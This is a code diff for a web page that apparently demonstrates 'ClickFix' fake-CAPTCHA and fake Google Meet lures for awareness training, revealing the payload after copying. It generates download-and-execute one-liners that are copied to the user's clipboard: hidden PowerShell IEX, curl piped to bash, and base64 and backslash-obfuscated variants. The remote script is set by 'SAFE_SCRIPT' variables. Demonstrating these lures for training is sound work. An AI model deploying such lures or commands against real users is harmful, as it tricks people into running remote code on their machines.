+    }
+    if (v === 'batch') {
+        return `cmd.exe /c start /min powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
+    }
+
+    // *nix Variants
+    if (v === 'curl-basic') {
+        return `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
+    }
+    if (v === 'base64-pipe') {
+        const cmd = `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
+        const b64 = btoa(cmd);
         return `echo "${b64}" | base64 -d | sh`;
-      }
-      
-      if (level === 3) {
-        // Obfuscated curl with backslashes
+    }
+    if (v === 'stealth-obf') {
         return `c\\u\\r\\l -s ${SAFE_SCRIPT_UNIX} | b\\a\\s\\h`;
-      }
     }
-    return "Error generating payload";
+
+    return "Error: Unknown Variant";
   }
 
-  function getInstructions() {
-    const isWin = state.platform === 'windows';
-    
-    if (state.scenario === 'filefix') {
-        return `1. Click the address bar above<br>2. Paste (Ctrl+V)<br>3. Press Enter`;
-    }
-
-    if (isWin) {
-      return `1. Press <strong>Win + R</strong><br>2. Paste (Ctrl + V)<br>3. Press Enter`;
-    } else {
-      return `1. Open Terminal (Cmd + Space, type "Terminal")<br>2. Paste (Cmd + V)<br>3. Press Enter`;
-    }
-  }
-
-  // Update UI
   function update() {
-    // 1. Show active scenario
-    Object.values(els.scenarios).forEach(el => el.classList.add('hidden'));
-    els.scenarios[state.scenario].classList.remove('hidden');
+    // 1. Show UI
+    Object.values(els.scenarios).forEach(el => el && el.classList.add('hidden'));
+    if (els.scenarios[state.scenario]) {
+        els.scenarios[state.scenario].classList.remove('hidden');
+    }
 
-    // 2. Update instructions text
-    const text = getInstructions();
-    Object.values(els.instr).forEach(el => el.innerHTML = text);
+    // 2. Update Instructions Text
+    const instr = getTypeInstruction();
+    els.instr.all.forEach(el => el.innerHTML = instr);
 
-    // 3. Reset specific states
-    els.captchaStep2.classList.add('hidden');
-    if (els.fakeCheckbox) els.fakeCheckbox.checked = false;
+    // 3. Reset Scenario States
+    if (els.meetStep1) els.meetStep1.classList.remove('hidden');
+    if (els.meetStep2) els.meetStep2.classList.add('hidden');
+    if (els.cfStep2) els.cfStep2.classList.add('hidden');
+    if (els.cfLoading) els.cfLoading.classList.add('hidden');
+    if (els.cfCheck) els.cfCheck.checked = false;
+    if (els.rcStep2) els.rcStep2.classList.add('hidden');
+    if (els.rcCheck) els.rcCheck.checked = false;
     els.explBox.classList.add('hidden');
   }
 
-  // Event Listeners
+  function updateVariants() {
+    const opts = variants[state.platform] || variants['windows'];
+    els.variantSelect.innerHTML = opts.map(o => `<option value="${o.id}">${o.label}</option>`).join('');
+    state.variant = opts[0].id;
+  }
+
+  // listeners
   els.scenarioSelect.addEventListener('change', e => { state.scenario = e.target.value; update(); });
-  els.platformSelect.addEventListener('change', e => { state.platform = e.target.value; update(); });
-  els.levelSelect.addEventListener('change', e => { state.level = e.target.value; update(); });
-
-  // Special CAPTCHA logic
-  els.fakeCheckbox?.addEventListener('change', () => {
-    setTimeout(() => els.captchaStep2.classList.remove('hidden'), 500);
+  
+  els.platformSelect.addEventListener('change', e => { 
+      state.platform = e.target.value; 
+      updateVariants();
+      update(); 
   });
 
-  // Handle Copy Action
-  els.copyBtns.forEach(btn => {
-    btn.addEventListener('click', async () => {
-      const payload = getPayload();
-      
-      try {
-        await navigator.clipboard.writeText(payload);
-        const originalText = btn.innerText;
-        btn.innerText = "Copied! (Now Paste It)";
-        btn.style.background = "#059669";
-        
-        // Show explanation
-        els.payloadCode.innerText = payload;
-        els.explBox.classList.remove('hidden');
+  els.variantSelect.addEventListener('change', e => { state.variant = e.target.value; });
 
-        setTimeout(() => {
-          btn.innerText = originalText;
-          btn.style.background = "";
-        }, 2000);
-      } catch (err) {
-        console.error("Copy failed", err);
-      }
-    });
+  els.closeExplBtn.addEventListener('click', () => els.explBox.classList.add('hidden'));
+
+  // Copy Logic
+  document.querySelectorAll('.btn-fake-copy').forEach(btn => {
+      btn.addEventListener('click', async () => {
+          const code = getPayloadCode();
+          try {
+              await navigator.clipboard.writeText(code);
+              els.payloadCode.innerText = code;
+              els.explBox.classList.remove('hidden');
+              
+              // Button Feedback
+              const oldText = btn.innerText;
+              btn.innerText = "Copied!";
+              setTimeout(() => btn.innerText = oldText, 2000);
+          } catch(e) { console.error(e); }
+      });
   });
+
+  // Scenario Specific Logic-
+  // Meet
+  const meetVideoText = document.querySelector('.meet-video-text');
+  
+  // "Fix it" -> Go to Step 2 (Instructions)
+  document.querySelectorAll('.btn-meet-fix').forEach(el => {
+      el.addEventListener('click', () => {
+         if (els.meetStep1) els.meetStep1.classList.add('hidden');
+         if (els.meetStep2) els.meetStep2.classList.remove('hidden'); 
+      });
+  });
+
+  // "Try again" -> Simulate Reconnection -> Fail back to Step 1
+  document.querySelectorAll('.btn-meet-try-again').forEach(el => {
+      el.addEventListener('click', () => {
+         // 1. Hide Popups
+         if (els.meetStep1) els.meetStep1.classList.add('hidden');
+         if (els.meetStep2) els.meetStep2.classList.add('hidden');
+         
+         // 2. Show Loading
+         if (meetVideoText) {
+             const oldText = meetVideoText.innerText;
+             meetVideoText.innerHTML = '<div class="spinner" style="border-top-color:white; margin:0 auto;"></div>';
+             
+             setTimeout(() => {
+                 // 3. Fail
+                 meetVideoText.innerText = oldText;
+                 if (els.meetStep1) els.meetStep1.classList.remove('hidden');
+             }, 1500);
+         }
+      });
+  });
+  
+  // Menu Kebab -> Toggle Step 2 (as a hidden feature or just reset?) -> Let's make it just show Step 1
+  document.querySelector('.meet-popup-menu')?.addEventListener('click', () => {
+      // Just toggle functionality? Or do nothing?
+      // Let's leave it as is or remove listener if not needed.
+      // Reset to Step 1 for simplicity
+      if (els.meetStep1) els.meetStep1.classList.remove('hidden');
+      if (els.meetStep2) els.meetStep2.classList.add('hidden');
+  });
+  
+  // Cloudflare
+  els.cfCheck?.addEventListener('change', () => {
+     els.cfLoading.classList.remove('hidden');
+     setTimeout(() => {
+         els.cfLoading.classList.add('hidden');
+         els.cfStep2.classList.remove('hidden');
+     }, 1500);
+  });
+
+  // ReCAPTCHA
+  els.rcCheck?.addEventListener('change', () => {
+      setTimeout(() => {
+          els.rcStep2.classList.remove('hidden');
+      }, 500);
+  });
+
 
   // Init
-  // Auto-detect Mac
-  if (navigator.platform.toUpperCase().indexOf('MAC') >= 0) {
-    state.platform = 'mac';
-    els.platformSelect.value = 'mac';
-  }
+  const detected = detectOS();
+  state.platform = detected;
+  els.platformSelect.value = detected;
+  updateVariants();
   update();
 
 </script>
